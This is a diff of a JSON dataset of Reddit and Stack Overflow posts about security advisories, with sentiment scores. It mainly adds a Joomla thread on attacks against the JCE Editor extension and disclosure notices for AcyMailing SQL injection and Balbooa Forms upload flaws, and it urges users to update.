+        "body": "Okay. If you update your extensions regularly you should not have an issue. Also this is only the case of you use JCE Editor. I did, in fact I have 5 Joomla sites and one was infected, luckily it was only a demo site. However I have to admit I was late in updating the extension on precisely that installation. Infected means I basically had to start from scratch. There was a JCE Editor update today but there have actually been a few since this was detected (2 weeks perhaps). So its not new unless its an entirely new threat which I certainly hope it isnt. \nThis is no reason to dump Joomla, it is still one of the most dedicated CMS teams out there. The reason we are all hearing about this is precisely because its a tightly knit community. \nIf I can help anyone in dire need of advice, let me know. ",
+        "score": 2,
+        "created_utc_ts": 1783624821,
+        "created_utc": "2026-07-09T19:20:21",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owjwhnk/",
+        "parent_id": "t3_1urs5ye",
+        "is_submitter": false,
+        "sentiment_score": 0.565,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0.099,
+          "neu": 0.768,
+          "pos": 0.133,
+          "compound": 0.5653
+        }
+      },
+      {
+        "id": "owjzcl9",
+        "author": "Dragongala",
+        "body": "I had 5 sites attacked all hosted on Godaddy. I’ve had to call them first thing every morning since June 22. Apparently, according to them, NOBODY in their company can work with Joomla. 🙄",
+        "score": -1,
+        "created_utc_ts": 1783625554,
+        "created_utc": "2026-07-09T19:32:34",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owjzcl9/",
+        "parent_id": "t3_1urs5ye",
+        "is_submitter": false,
+        "sentiment_score": -0.459,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.091,
+          "neu": 0.909,
+          "pos": 0,
+          "compound": -0.4588
+        }
+      },
+      {
+        "id": "owkh091",
+        "author": "JoJoJoshua",
+        "body": "My point exactly. Joomla is becoming/is obsolete.",
+        "score": -1,
+        "created_utc_ts": 1783630038,
+        "created_utc": "2026-07-09T20:47:18",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owkh091/",
+        "parent_id": "t1_owjzcl9",
+        "is_submitter": false,
+        "sentiment_score": -0.296,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.268,
+          "neu": 0.732,
+          "pos": 0,
+          "compound": -0.296
+        }
+      },
+      {
+        "id": "owknfw5",
+        "author": "nomadfaa",
+        "body": "Don’t be too complacent Joomla isn’t the only CMS having issues WP and more",
+        "score": 2,
+        "created_utc_ts": 1783631651,
+        "created_utc": "2026-07-09T21:14:11",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owknfw5/",
+        "parent_id": "t1_owjaplp",
+        "is_submitter": false,
+        "sentiment_score": 0.347,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0.081,
+          "neu": 0.748,
+          "pos": 0.17,
+          "compound": 0.347
+        }
+      },
+      {
+        "id": "owkwxwz",
+        "author": "Open_Sourcey",
+        "body": "Are you assuming GoDaddy would fix the attack?",
+        "score": 2,
+        "created_utc_ts": 1783634131,
+        "created_utc": "2026-07-09T21:55:31",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owkwxwz/",
+        "parent_id": "t1_owjzcl9",
+        "is_submitter": true,
+        "sentiment_score": -0.477,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.307,
+          "neu": 0.693,
+          "pos": 0,
+          "compound": -0.4767
+        }
+      },
+      {
+        "id": "owllujm",
+        "author": "Open_Sourcey",
+        "body": "Yes indeed QED you need to keep extensions updated and that would now protect you in this instance but not before JCE patched it. INot everyone has the luxury of constant monitoring or indeed the capability. f you had 5 sites using an old JCE editor and only one was infected  before patching then you were fortunate to get away with it. \n\nI agree that Joomla is a good product and good community.",
+        "score": 1,
+        "created_utc_ts": 1783641554,
+        "created_utc": "2026-07-09T23:59:14",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owllujm/",
+        "parent_id": "t1_owjwhnk",
+        "is_submitter": true,
+        "sentiment_score": 0.921,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0.051,
+          "neu": 0.732,
+          "pos": 0.218,
+          "compound": 0.9209
+        }
+      },
+      {
+        "id": "owpbvrn",
+        "author": "PixelCharlie",
+        "body": "Here's 100 WordPress plugins with severe security issues and no roadmap to fix. https://www.reddit.com/r/StopBadBots/s/LPWlxD7D7F",
+        "score": 4,
+        "created_utc_ts": 1783693004,
+        "created_utc": "2026-07-10T14:16:44",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owpbvrn/",
+        "parent_id": "t1_owjaplp",
+        "is_submitter": false,
+        "sentiment_score": -0.34,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.264,
+          "neu": 0.604,
+          "pos": 0.132,
+          "compound": -0.34
+        }
+      },
+      {
+        "id": "owsrhy5",
+        "author": "TheRealTriorama",
+        "body": "I just want to share two exetnsions, that i discovered because of this Vulnerability:\n\n[https://htprotect.org](https://htprotect.org)\n\n[Akeeba Panopticon](https://www.akeeba.com/products/panopticon.html)\n\nBoth free and open source, helping you to monitor and update your site(s) ",
+        "score": 3,
+        "created_utc_ts": 1783726206,
+        "created_utc": "2026-07-10T23:30:06",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owsrhy5/",
+        "parent_id": "t3_1urs5ye",
+        "is_submitter": false,
+        "sentiment_score": 0.707,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0.062,
+          "neu": 0.674,
+          "pos": 0.264,
+          "compound": 0.7073
+        }
+      },
+      {
+        "id": "owvmn87",
+        "author": "Open_Sourcey",
+        "body": "Thank you.",
+        "score": 2,
+        "created_utc_ts": 1783770445,
+        "created_utc": "2026-07-11T11:47:25",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owvmn87/",
+        "parent_id": "t1_owsrhy5",
+        "is_submitter": true,
+        "sentiment_score": 0.361,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 0.286,
+          "pos": 0.714,
+          "compound": 0.3612
+        }
+      }
+    ],
+    "created_utc": "2026-07-09T14:38:13",
+    "first_author_comment": "Depends how you measure 'old.' It was only reported last month and it is only now hitting widespread exploitation. Your old maybe anothers today. It is well worth re-warning.",
+    "num_comments": 37,
+    "score": 13,
+    "subreddit": "joomla",
+    "tag": "Joomla 6",
+    "tags": [],
+    "title": "Serious attack on JCE Editor- CVE-2026-48907",
+    "updatedAt": "2026-08-19T01:00:55.499Z",
+    "upvote_ratio": 0.94,
+    "url": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/",
+    "versionList": [
+      "2026.0.0",
+      "48907.0.0"
+    ],
+    "isAboutCve": true,
+    "isAboutLatestUpdate": false,
+    "author_description_sentiment": {
+      "score": -0.527,
+      "detail": {
+        "neg": 0.087,
+        "neu": 0.913,
+        "pos": 0,
+        "compound": -0.5267
+      }
+    },
+    "category": "Negative",
+    "comments_avg_sentiment_score": 0.108,
+    "sentiment_score": -0.209
+  },
+  {
+    "_id": "6a84ad4149715ba391887c88",
+    "redditId": "1urr2ye",
+    "author": "mySitesGuru",
+    "author_description": "[AcyMailing](https://www.acymailing.com/) is one of the most widely installed newsletter and email-marketing extensions for Joomla. During routine security research on the extensions our customers rely on.\n\n[**mySites.guru**](http://mySites.guru) **discovered an unauthenticated SQL injection vulnerability in AcyMailing, and reported it privately to the developers before disclosing anything publicly.** \n\nThe vulnerability allows a crafted SQL injection to read the full contents of your database - password hashes, personal data, content - everything.\n\nThe fix is now available in AcyMailing 10.11.1.\n\nIf you run AcyMailing on any Joomla site, update to 10.11.1 now. If you manage more than a handful of sites, read on for how to find every affected one at once. \n\nDiscovered, Researched and Responsibly Reported by Phil Taylor/mySites.guru\n\nCVE-2026-56292",
+    "awards": [],
+    "comments": [
+      {
+        "id": "owht0hy",
+        "author": "wbaccus",
+        "body": "Thanks for the heads up!",
+        "score": 3,
+        "created_utc_ts": 1783605895,
+        "created_utc": "2026-07-09T14:04:55",
+        "permalink": "https://reddit.com/r/joomla/comments/1urr2ye/acymailing_sql_injection_vulnerability_upgrade/owht0hy/",
+        "parent_id": "t3_1urr2ye",
+        "is_submitter": false,
+        "sentiment_score": 0.493,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 0.556,
+          "pos": 0.444,
+          "compound": 0.4926
+        }
+      },
+      {
+        "id": "owismjt",
+        "author": "mySitesGuru",
+        "body": "Subscribe at [https://list.mysites.guru/](https://list.mysites.guru/) for the next one... coming soon behind this one....",
+        "score": 2,
+        "created_utc_ts": 1783614969,
+        "created_utc": "2026-07-09T16:36:09",
+        "permalink": "https://reddit.com/r/joomla/comments/1urr2ye/acymailing_sql_injection_vulnerability_upgrade/owismjt/",
+        "parent_id": "t1_owht0hy",
+        "is_submitter": true,
+        "sentiment_score": 0,
+        "sentiment_bucket": "Neutral",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 1,
+          "pos": 0,
+          "compound": 0
+        }
+      }
+    ],
+    "created_utc": "2026-07-09T13:58:22",
+    "first_author_comment": "Subscribe at [https://list.mysites.guru/](https://list.mysites.guru/) for the next one... coming soon behind this one....",
+    "num_comments": 2,
+    "score": 9,
+    "subreddit": "joomla",
+    "tag": "Administration/Technical",
+    "tags": [],
+    "title": "AcyMailing SQL Injection Vulnerability - Upgrade Today!",
+    "updatedAt": "2026-08-19T01:00:57.183Z",
+    "upvote_ratio": 0.85,
+    "url": "https://reddit.com/r/joomla/comments/1urr2ye/acymailing_sql_injection_vulnerability_upgrade/",
+    "versionList": [],
+    "isAboutCve": true,
+    "isAboutLatestUpdate": true,
+    "author_description_sentiment": {
+      "score": -0.25,
+      "detail": {
+        "neg": 0.046,
+        "neu": 0.933,
+        "pos": 0.021,
+        "compound": -0.25
+      }
+    },
+    "category": "Neutral",
+    "comments_avg_sentiment_score": 0.246,
+    "sentiment_score": -0.002
+  },
+  {
+    "_id": "6a84ad4549715ba391887c8b",
+    "redditId": "1urlq47",
+    "author": "mySitesGuru",
+    "author_description": "Balbooa Forms is a popular drag-and-drop form builder for Joomla, installed as the `com_baforms` component and used for contact, registration, and survey forms on thousands of sites. Up to and including version 2.4.0, its frontend attachment upload had a serious flaw: it accepted a file from any anonymous visitor, with no login, no CSRF token, and no check on the file type. An attacker could upload a `.php` file into a public folder and then run it, which is unauthenticated remote code execution, the worst outcome a web flaw can have. This was a zero-day: it was already being exploited in the wild when we found it, before any patch existed, and those attacks are still going on now against sites that have not updated. CVE-2026-56291",
+    "awards": [],
+    "created_utc": "2026-07-09T09:55:22",
+    "first_author_comment": null,
+    "num_comments": 0,
+    "score": 4,
+    "subreddit": "joomla",
+    "tag": "Administration/Technical",
+    "tags": [],
+    "title": "Balbooa Forms Fixes an Unauthenticated File Upload RCE",
+    "updatedAt": "2026-08-19T01:01:00.555Z",
+    "upvote_ratio": 0.83,
+    "url": "https://reddit.com/r/joomla/comments/1urlq47/balbooa_forms_fixes_an_unauthenticated_file/",
+    "versionList": [],
+    "isAboutCve": true,
+    "isAboutLatestUpdate": true,
+    "author_description_sentiment": {
+      "score": -0.926,
+      "detail": {
+        "neg": 0.158,
+        "neu": 0.79,
+        "pos": 0.052,
+        "compound": -0.926
+      }
+    },
+    "category": "Negative",
+    "comments": [],
+    "comments_avg_sentiment_score": 0,
+    "sentiment_score": -0.463
   },
   {
     "_id": "6a390d8a4ce8d84a7e45aca8",
@@ -5842,7 +7034,7 @@
     "tag": null,
     "tags": [],
     "title": "Defender AV CVE-2023-36010 still flagged even on latest engine/platform?",
-    "updatedAt": "2026-08-18T00:58:00.721Z",
+    "updatedAt": "2026-08-19T01:03:06.675Z",
     "upvote_ratio": 0.78,
     "url": "https://reddit.com/r/sysadmin/comments/1ucezrg/defender_av_cve202336010_still_flagged_even_on/",
     "versionList": [
@@ -5972,7 +7164,7 @@
     "tag": null,
     "tags": [],
     "title": "WEIRD RUSTDESK REQUEST FROM MY OWN MACBOOK",
-    "updatedAt": "2026-08-18T00:58:09.384Z",
+    "updatedAt": "2026-08-19T01:03:15.317Z",
     "upvote_ratio": 1,
     "url": "https://reddit.com/r/rustdesk/comments/1ub5cdv/weird_rustdesk_request_from_my_own_macbook/",
     "versionList": [],
@@ -6021,7 +7213,7 @@
     "tag": null,
     "tags": [],
     "title": "CVE-2026-9189: payment bypass in the Contact Form 7 PayPal &amp; Stripe Add-on (now patched, update if you use it)",
-    "updatedAt": "2026-08-18T00:58:24.796Z",
+    "updatedAt": "2026-08-19T01:03:30.871Z",
     "upvote_ratio": 0.78,
     "url": "https://reddit.com/r/Wordpress/comments/1u9ea81/cve20269189_payment_bypass_in_the_contact_form_7/",
     "versionList": [
@@ -6072,7 +7264,7 @@
         "id": "oprf3cd",
         "author": "throwaway234f32423df",
         "body": "fixed on Ubuntu about an hour ago even though they haven't put up a CVE page for it yet",
-        "score": 4,
+        "score": 5,
         "created_utc_ts": 1780598242,
         "created_utc": "2026-06-04T18:37:22",
         "permalink": "https://reddit.com/r/apache/comments/1tws4w7/the_http2_bomb_that_knocks_nginx_and_apache/oprf3cd/",
@@ -6096,7 +7288,7 @@
     "tag": null,
     "tags": [],
     "title": "The HTTP/2 Bomb That Knocks nginx and Apache Offline With a Single Connection",
-    "updatedAt": "2026-08-18T00:59:42.064Z",
+    "updatedAt": "2026-08-19T01:04:49.063Z",
     "upvote_ratio": 1,
     "url": "https://reddit.com/r/apache/comments/1tws4w7/the_http2_bomb_that_knocks_nginx_and_apache/",
     "versionList": [
@@ -6134,7 +7326,7 @@
       "Use Cases"
     ],
     "title": "openclaw crossed 500k downloads a day this week. here are the 5 things nobody tells you when you're one of them",
-    "updatedAt": "2026-08-18T01:03:37.896Z",
+    "updatedAt": "2026-08-19T01:08:51.581Z",
     "upvote_ratio": 0.8,
     "url": "https://reddit.com/r/openclaw/comments/1srpodd/openclaw_crossed_500k_downloads_a_day_this_week/",
     "versionList": [
@@ -6181,7 +7373,7 @@
       "General Discussion"
     ],
     "title": "Security Check Recommended (CVE-2025-55182): Please review your application's dependencies. If you are running React or Next.js",
-    "updatedAt": "2026-08-18T01:10:16.197Z",
+    "updatedAt": "2026-08-19T01:15:43.070Z",
     "upvote_ratio": 0.91,
     "url": "https://reddit.com/r/react/comments/1pfyta0/security_check_recommended_cve202555182_please/",
     "versionList": [
@@ -6624,7 +7816,7 @@
       "vercel"
     ],
     "title": "What is React Server Components vulnerability CVE-2025-55182 and how does it affect Next.js?",
-    "updatedAt": "2026-08-18T01:10:27.764Z",
+    "updatedAt": "2026-08-19T01:15:55.192Z",
     "upvote_ratio": null,
     "url": "https://stackoverflow.com/questions/79837478/what-is-react-server-components-vulnerability-cve-2025-55182-and-how-does-it-aff",
     "versionList": [
@@ -6680,7 +7872,7 @@
       "Troubleshooting | Android"
     ],
     "title": "Chromebook not updating to the new update that fixes CVE-2025-6554",
-    "updatedAt": "2026-08-18T01:13:19.555Z",
+    "updatedAt": "2026-08-19T01:18:54.026Z",
     "upvote_ratio": 1,
     "url": "https://reddit.com/r/chrome/comments/1lpij7v/chromebook_not_updating_to_the_new_update_that/",
     "versionList": [
@@ -6803,7 +7995,7 @@
       "News"
     ],
     "title": "🔒 Update Chrome Today! – New 0-day Vulnerability (CVE-2025-5419) Is Being Exploited in the Wild",
-    "updatedAt": "2026-08-18T01:13:28.726Z",
+    "updatedAt": "2026-08-19T01:19:03.467Z",
     "upvote_ratio": 0.93,
     "url": "https://reddit.com/r/chrome/comments/1l2zxcb/update_chrome_today_new_0day_vulnerability/",
     "versionList": [
